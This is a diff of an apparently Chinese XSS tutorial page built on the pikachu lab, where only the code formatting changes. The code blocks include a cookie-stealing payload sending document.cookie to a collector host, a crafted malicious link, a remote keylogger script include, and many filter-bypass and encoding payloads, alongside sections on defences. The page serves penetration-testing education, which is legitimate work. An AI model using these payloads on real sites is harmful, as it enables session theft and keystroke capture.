@@ -494,14 +494,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.9k
+                    6.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    29 分
+                    28 分
                 </div>
                 
 
@@ -543,10 +543,8 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/20201102165714.png" alt="反射型XSS攻击流程"></center>
 
 <p><strong>程序源码示例</strong>：</p>
-<pre><code class="php">&lt;?php
-$name = $_GET[&#39;name&#39;];
-echo &quot;Welcome $name&lt;br&gt;&quot;;
-?&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$name = $_GET[<span class="hljs-string">'name'</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"Welcome $name&lt;br&gt;"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
 <p><strong>操作实例</strong>：<font color="red">最基本的XSS漏洞，数据流向：前端 → 后端 → 前端</font></p>
 <ol>
 <li><p>打开pikachu中的反射型<code>XSS(get)</code>，修改文本框的<code>maxlength</code>属性并在文本框中输入：<code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code>。</p>
@@ -696,10 +694,10 @@ echo &quot;Welcome $name&lt;br&gt;&quot;;
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台Cookie结果展示界面.png" alt="XSS后台Cookie结果展示界面"></center>
 </li>
 <li><p><strong>payload</strong></p>
-<pre><code class="javascript">&lt;script&gt;document.location = &#39;http://192.168.19.136:8080/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-built_in">document</span>.location = <span class="hljs-string">'http://192.168.19.136:8080/pkxss/xcookie/cookie.php?cookie='</span> + <span class="hljs-built_in">document</span>.cookie;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>构造的恶意链接：（恶意信息需要URL格式转码一下以便隐藏）</p>
-<pre><code class="shell">http://192.168.19.136:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.19.136%3A8080%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://192.168.19.136:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.19.136%3A8080%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>用户访问链接后网页显示的结果。</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/百度一下.png" alt="百度一下"></center>
@@ -832,27 +830,26 @@ echo &quot;Welcome $name&lt;br&gt;&quot;;
 <li><strong>同源策略</strong>：为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：<code>x.com</code>域名下的js不能操作y.com域名下的对象。那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</li>
 </ul>
 <p><strong>Tips</strong>:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p>
-<pre><code class="javascript">&lt;script src=&quot;...&quot;&gt;  //加载本地js执行
-&lt;img src=&quot;...&quot;&gt;  //图片
-&lt;link href=&quot;...&quot;&gt;  //css
-&lt;iframe src=&quot;...&quot;&gt;  //任意资源</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">"..."</span>&gt;  <span class="hljs-comment">//加载本地js执行</span><br>&lt;img src="..."&gt;  //图片<br>&lt;link href="..."&gt;  //css<br>&lt;iframe src="..."&gt;  //任意资源<br></code></pre></td></tr></table></figure>
+
 <ul>
 <li><p><strong>同源策略修改</strong>:<br><code>D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php</code><br>   同之前的案例到后台设置好<code>Access-Control-Allow-Origin</code>，设置为<code>*</code>，既允许所有人访问。</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/键盘记录设置跨域访问.png" alt="键盘记录设置跨域访问"></center>
 </li>
 <li><p><strong>rk.js关键代码解读</strong>:</p>
-<pre><code class="javascript">var realkey = String.fromCharCode(event.keyCode);  //获取用户键盘记录，最后转化为字符串
-xl+=realkey;   //赋值给x1
-show();    //调用show涵数，通过下面ajax进行post发送键盘记录人内容</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> realkey = <span class="hljs-built_in">String</span>.fromCharCode(event.keyCode);  <span class="hljs-comment">//获取用户键盘记录，最后转化为字符串</span><br>xl+=realkey;   <span class="hljs-comment">//赋值给x1</span><br>show();    <span class="hljs-comment">//调用show涵数，通过下面ajax进行post发送键盘记录人内容</span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>payload</strong>:</p>
-<pre><code class="html">&lt;script src=&quot;http://192.168.19.136:8080/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.19.136:8080/pkxss/rkeypress/rk.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
 </li>
 </ul>
 <h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>​        XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。</p>
 <ol>
 <li><p><strong>payload</strong>：</p>
-<pre><code class="javascript">&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">'"&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>在留言中输入payload。</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS盲打提交payload.png" alt="XSS盲打提交payload"></center>
@@ -871,32 +868,21 @@ show();    //调用show涵数，通过下面ajax进行post发送键盘记录人�
 <li><p>利用<code>&lt;&gt;</code>标记注射HTML、JavaScript</p>
 <p>通过<code>&lt;script&gt;</code>标签就能任意插入由JavaScript或VBScript编写的恶意脚本代码</p>
 <p>常用案例：</p>
-<pre><code class="javascript">&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-regexp">/xss/</span>)&lt;<span class="hljs-regexp">/script&gt;</span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>利用HTML标签属性值执行XSS</p>
 <p>通过<code>javascript:[code]</code>伪协议形式编写恶意脚本</p>
 <p>常用案例：</p>
-<pre><code class="javascript">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;
-&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;table background=<span class="hljs-string">"javascript:alert(/xss/)"</span>&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert('xss')"</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>空格、回车、<code>Tab</code>绕过过滤</p>
 <p>由于在编译时JavaScript语句通常以分号结尾，如果JavaScript引擎确定一个语句是完整的，而这一行的结尾有换行符，那么就可以省略分号；否则JavaScript会继续处理发现的内容，直到遇到一个分号或发现语句完整为止。</p>
 <p>常用案例：</p>
-<pre><code class="javascript">// Tab键
-&lt;img src=&quot;java    script:alert(&#39;xss&#39;)&quot;&gt;            
-// 回车
-&lt;img src=&quot;javas
-cript:
-alert(&#39;xss&#39;)&quot;&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Tab键</span><br>&lt;img src=<span class="hljs-string">"java	script:alert('xss')"</span>&gt;			<br><span class="hljs-comment">// 回车</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javas<br>cript:<br>alert('xss')"</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>对标签属性值进行转码</p>
 <p>常用案例：</p>
-<pre><code class="javascript">&lt;img src=&quot;javascript:slert(&#39;xss&#39;);&quot;&gt;
-替换成：
-&lt;img src=&quot;javascrip&amp;#116&amp;#58slert(&#39;xss&#39;);&quot;&gt;
-其中，t的ASCII码值为116，:的ASCII码值为58
-再进一步替换：
-&lt;img src=&quot;javascrip&amp;#0000116&amp;#0000058slert(&#39;xss&#39;);&quot;&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">"javascript:slert('xss');"</span>&gt;<br>替换成：<br>&lt;img src=<span class="hljs-string">"javascrip&amp;#116&amp;#58slert('xss');"</span>&gt;<br>其中，t的ASCII码值为<span class="hljs-number">116</span>，:的ASCII码值为<span class="hljs-number">58</span><br>再进一步替换：<br>&lt;img src=<span class="hljs-string">"javascrip&amp;#0000116&amp;#0000058slert('xss');"</span>&gt;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>产生事件如<code>click</code>、<code>mouseover</code>、<code>load</code>等</p>
 <p>W3C将事件分为3种不同的类型：</p>
@@ -906,89 +892,24 @@ alert(&#39;xss&#39;)&quot;&gt;</code></pre>
 <li>变化（对文档进行修改）</li>
 </ul>
 <p>常用案例：</p>
-<pre><code class="javascript">&lt;input type=&quot;button&quot; value=&quot;Click Me&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;/&gt;
-&lt;img src=&quot;#&quot; onerror=alert(/xss/)</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;input type=<span class="hljs-string">"button"</span> value=<span class="hljs-string">"Click Me"</span> onclick=<span class="hljs-string">"alert('xss')"</span>/&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xss/)</span></span></span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>利用CSS跨站过滤</p>
 <p>常见案例：</p>
-<pre><code class="javascript">&lt;div style=&quot;background-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;
-&lt;style&gt;
-body {background-image:url(&quot;javascript:alert(/xss/)&quot;);}
-&lt;/style&gt;
-&lt;div style=&quot;width:expression(alert(&#39;XSS&#39;));&quot;&gt;
-&lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;
-&lt;style&gt;
-body {background-image: expression(alert(&quot;xss&quot;));}
-&lt;/style&gt;
-&lt;div style=&quot;list-style-image:url(javascript:alert(&#39;XSS&#39;));&quot;&gt;
-&lt;div style=&quot;background-image:url(javascript:alert(&#39;XSS&#39;));&quot;&gt;
-&lt;img src=&quot; javascript:alert(&#39;xss&#39;)&quot;&gt;
-&lt;style&gt;
-    @import &#39;javascript:alert(/xss/)&#39;;
-&lt;/style&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div style=<span class="hljs-string">"background-image:url(javascript:alert('xss'))"</span>&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br>body &#123;background-image:url("javascript:alert(/xss/)");&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br>&lt;div style="width:expression(alert('XSS'));"&gt;<br>&lt;img src="#" style="xss:expression(alert(/xss/));"&gt;<br>&lt;style&gt;<br>body &#123;background-image: expression(alert("xss"));&#125;<br>&lt;/style&gt;<br>&lt;div style="list-style-image:url(javascript:alert('XSS'));"&gt;<br>&lt;div style="background-image:url(javascript:alert('XSS'));"&gt;<br>&lt;img src=" javascript:alert('xss')"&gt;<br>&lt;style&gt;<br>    @import 'javascript:alert(/xss/)';<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>扰乱XSS过滤规则</p>
 <p>常见案例：</p>
-<pre><code class="javascript">一个正常的XSS输入:
-&lt;img src=&quot;javascript:alert(0);&quot;&gt;
-转换大小写后的XSS:
-&lt;IMG SRC=&quot;javascript:alert(0);&quot;&gt;
-大小写混淆的XSS：
-&lt;iMg sRC=&quot;JaVasCript:alert(0);&quot;&gt;
-不用双引号，而是使用单引号的XSS:
-&lt;img src=&#39;javascript:alert(0);&#39;&gt;
-不适用引号的XSS：
-&lt;img src=javascript:alert(0);&gt;
-不需要空格的XSS:
-&lt;img/src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;
-构造不同的全角字符:
-&lt;div style=&quot;{left:ｅｘｐｒｅｓｓｉｏｎ(alert(&#39;xss&#39;))&quot;&gt;
-利用注释符
-&lt;div style=&quot;wid/**/th:expre/*xss*/ssion(alert(&#39;xss&#39;));&quot;&gt;
-\和\0–
-&lt;style&gt;
-@imp\0ort &#39;java\0scri\pt:alert(/xss/)&#39;;
-&lt;/style&gt;
-&lt;style&gt;
-@imp\ort &#39;ja\0va\00sc\000ri\0000pt:alert(/xss/)&#39;;
-&lt;/style&gt;
-CSS关键字转码
-&lt;div style=&quot;xss:\65xpression(alert(&#39;XSS&#39;));&quot;&gt;
-&lt;div style=&quot;xss:\065xpression(alert(&#39;XSS&#39;));&quot;&gt;
-&lt;div style=&quot;xss:\0065xpression(alert(&#39;XSS&#39;));&quot;&gt;
-&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;
-&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;
-&lt;style&gt;&lt;img src=“&lt;/style&gt;&lt;img src=x onerror=alert(1)//”&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript">一个正常的XSS输入:<br>&lt;img src="javascript:alert(0);"&gt;<br>转换大小写后的XSS:<br>&lt;IMG SRC="javascript:alert(0);"&gt;<br>大小写混淆的XSS：<br>&lt;iMg sRC="JaVasCript:alert(0);"&gt;<br>不用双引号，而是使用单引号的XSS:<br>&lt;img src='javascript:alert(0);'&gt;<br>不适用引号的XSS：<br>&lt;img src=javascript:alert(0);&gt;<br>不需要空格的XSS:<br>&lt;img/src="javascript:alert('xss');"&gt;<br>构造不同的全角字符:<br>&lt;div style="&#123;left:ｅｘｐｒｅｓｓｉｏｎ(alert('xss'))"&gt;<br>利用注释符<br>&lt;div style="wid/**/th:expre/*xss*/ssion(alert('xss'));"&gt;<br>\和\0–<br>&lt;style&gt;<br>@imp\0ort 'java\0scri\pt:alert(/xss/)';<br>&lt;/style&gt;<br>&lt;style&gt;<br>@imp\ort 'ja\0va\00sc\000ri\0000pt:alert(/xss/)';<br>&lt;/style&gt;<br>CSS关键字转码<br>&lt;div style="xss:\65xpression(alert('XSS'));"&gt;<br>&lt;div style="xss:\065xpression(alert('XSS'));"&gt;<br>&lt;div style="xss:\0065xpression(alert('XSS'));"&gt;<br>&lt;!--&lt;img src="--&gt;&lt;img src=x onerror=alert(1)//"&gt;<br>&lt;comment&gt;&lt;img src="&lt;/comment&gt;&lt;img src=x onerror=alert(1)//"&gt;<br>&lt;style&gt;&lt;img src=“&lt;/style&gt;&lt;img src=x onerror=alert(1)//”&gt;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>利用字符编码</p>
 <p>常用案例：</p>
-<pre><code class="javascript">原始语句:
-&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;
-十进制编码
-&lt;img
-src=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;
-#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41&amp;#59&quot;&gt;
-&lt;img
-src=&quot;&amp;#0106;&amp;#097;&amp;#0118;&amp;#097;&amp;#0115;&amp;#099;&amp;#0114;&amp;#0105;&amp;#0112;&amp;#
-0116;&amp;#058;&amp;#097;&amp;#0108;&amp;#0101;&amp;#0114;&amp;#0116;&amp;#040;&amp;#039;&amp;#0120;&amp;#
-0115;&amp;#0115;&amp;#039;&amp;#041;&amp;#059;&quot;&gt;
-&lt;img
-src=&quot;&amp;#0000106&amp;#000097&amp;#0000118&amp;#000097&amp;#0000115&amp;#000099&amp;#000011
-4&amp;#0000105&amp;#0000112&amp;#0000116&amp;#000058&amp;#000097&amp;#0000108&amp;#0000101&amp;
-#0000114&amp;#0000116&amp;#000040&amp;#000039&amp;#0000120&amp;#0000115&amp;#0000115&amp;#00
-0039&amp;#000041&amp;#000059&quot;&gt;
-十六进制编码
-&lt;img
-src=&quot;&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#
-x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x78&amp;#x73&amp;#x73&amp;#x27&amp;#x29&amp;#x3b&quot;&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">原始语句:<br>&lt;img src="javascript:alert('xss');"&gt;<br>十进制编码<br>&lt;img<br>src="&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;<br>#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41&amp;#59"&gt;<br>&lt;img<br>src="&amp;#0106;&amp;#097;&amp;#0118;&amp;#097;&amp;#0115;&amp;#099;&amp;#0114;&amp;#0105;&amp;#0112;&amp;#<br>0116;&amp;#058;&amp;#097;&amp;#0108;&amp;#0101;&amp;#0114;&amp;#0116;&amp;#040;&amp;#039;&amp;#0120;&amp;#<br>0115;&amp;#0115;&amp;#039;&amp;#041;&amp;#059;"&gt;<br>&lt;img<br>src="&amp;#0000106&amp;#000097&amp;#0000118&amp;#000097&amp;#0000115&amp;#000099&amp;#000011<br>4&amp;#0000105&amp;#0000112&amp;#0000116&amp;#000058&amp;#000097&amp;#0000108&amp;#0000101&amp;<br>#0000114&amp;#0000116&amp;#000040&amp;#000039&amp;#0000120&amp;#0000115&amp;#0000115&amp;#00<br>0039&amp;#000041&amp;#000059"&gt;<br>十六进制编码<br>&lt;img<br>src="&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#<br>x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x78&amp;#x73&amp;#x73&amp;#x27&amp;#x29&amp;#x3b"&gt;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>利用字符编码<code>eval()</code>函数、<code>eval()</code>函数和<code>string.fromCharCode()</code>函数过滤</p>
 <p>常用案例：</p>
-<pre><code class="javascript">&lt;script&gt;
-eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;);
-&lt;/script&gt;
-&lt;img
-src=&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span>);<br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span><br><span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120</span></span></span><br></code></pre></td></tr></table></figure>
+
 </li>
 </ol>
 <h1 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h1><p>​        大多数网站为了避免xss的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。</p>
@@ -1011,17 +932,8 @@ src=&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120</code
 <p><strong>可用的quotestyle类型</strong>：<br>ENT_COMPAT - 默认。仅编码双引号<br>ENT_QUOTES - 编码双引号和单引号<br>ENT_NOQUOTES - 不编码任何引号</p>
 <p>可使用以下语句绕过：  q’ onclick=’alert(111)’</p>
 <h2 id="xss之href输出绕过"><a href="#xss之href输出绕过" class="headerlink" title="xss之href输出绕过"></a>xss之href输出绕过</h2><p>​        javascript:alert(1111) 直接代入a标签herf里面一样可以绕过htmlspecialchars</p>
-<h2 id="xss之js输出绕过"><a href="#xss之js输出绕过" class="headerlink" title="xss之js输出绕过"></a>xss之js输出绕过</h2><pre><code class="javascript">&lt;script&gt;
-    $ms=&#39;11&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt; ;
-if($ms.length != 0){
-    if($ms == &#39;tmac&#39;){
-        $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)
-    }else {
-//            alert($ms);
-            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)
-        }
-}
-&lt;/script&gt;</code></pre>
+<h2 id="xss之js输出绕过"><a href="#xss之js输出绕过" class="headerlink" title="xss之js输出绕过"></a>xss之js输出绕过</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    $ms=<span class="hljs-string">'11'</span>&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(1111)&lt;/</span>script&gt; ;<br><span class="hljs-keyword">if</span>($ms.length != <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">if</span>($ms == <span class="hljs-string">'tmac'</span>)&#123;<br>        $(<span class="hljs-string">'#fromjs'</span>).text(<span class="hljs-string">'tmac确实厉害,看那小眼神..'</span>)<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//            alert($ms);</span><br>            $(<span class="hljs-string">'#fromjs'</span>).text(<span class="hljs-string">'无论如何不要放弃心中所爱..'</span>)<br>        &#125;<br>&#125;<br>&lt;<span class="hljs-regexp">/script&gt;</span><br></code></pre></td></tr></table></figure>
+
 <h1 id="XSS常规防范"><a href="#XSS常规防范" class="headerlink" title="XSS常规防范"></a>XSS常规防范</h1><p>​        由于XSS通常可以插入在script标签、HTML注释、标签属性名、标签属性值、标签名字、CSS等中，所以接下来我们简单讲讲如何防御XSS攻击。  </p>
 <h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><p>​        输入验证就是对用户提交的信息进行有效验证，仅接受<strong>指定长度范围内</strong>的，采用<strong>适当的内容</strong>提交，阻止或者忽略除此外的其他任何数据。  </p>
 <p>输入验证要根据实际情况设计，下面是一些常见的检测和过滤：</p>
@@ -1034,96 +946,15 @@ if($ms.length != 0){
 <h2 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h2><p>​        大多数的Web应用程序都存在一个通病，就是会把用户输入的信息完完整整的输出在页面中，这样很容易便会产生一个XSS。HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体编号替代字面量字符，这样做可以确保浏览器安全处理可能存在恶意字符，将其当做HTMl文档的内容而非结构加以处理。</p>
 <h2 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h2><p>有时根本就不需要考虑到它是不是HTML标签，我们根本用不到HTML标签。不管是采用输入过滤还是输出过滤，都是针对数据信息进行黑/白名单式的过滤。  </p>
 <p>不同的javascript写法包括：  </p>
-<pre><code class="javascript">大小写混淆:
-&lt;img src=JaVaScRiPt:alert(‘xss’)&gt;
-插入[tab]键；
-&lt;img src=”jav alert(‘xss’);”&gt;
-插入回车符:
-&lt;img src=”jav
-asrci
-alert(‘xss’);”&gt;
-使用/**/注释符:
-&lt;img src=”java/*xxx*/script:alert(‘xss’);”&gt;
-重复混淆关键字:
-&lt;img src=”java/*/*javascript*/script/*javascript*/*/script:alert(‘xss
-使用&amp;#十六进制编码字符:
-&lt;img src=”jav&amp;#x09;ascript:alert(‘xss’);”&gt;
-使用&amp;#十进制编码字符:
-&lt;img src= jav&amp;#97;script:alert(‘xss’);”&gt;
-使用&amp;#十进制编码字符(加入大量的0000):
-&lt;img src=”j&amp;#00097;vascript:alert(‘xss’);”&gt;
-在开头插入空格：
-&lt;img src=” alert(‘xss’);”&gt;
-ascript:
-pt:
-javascript:</code></pre>
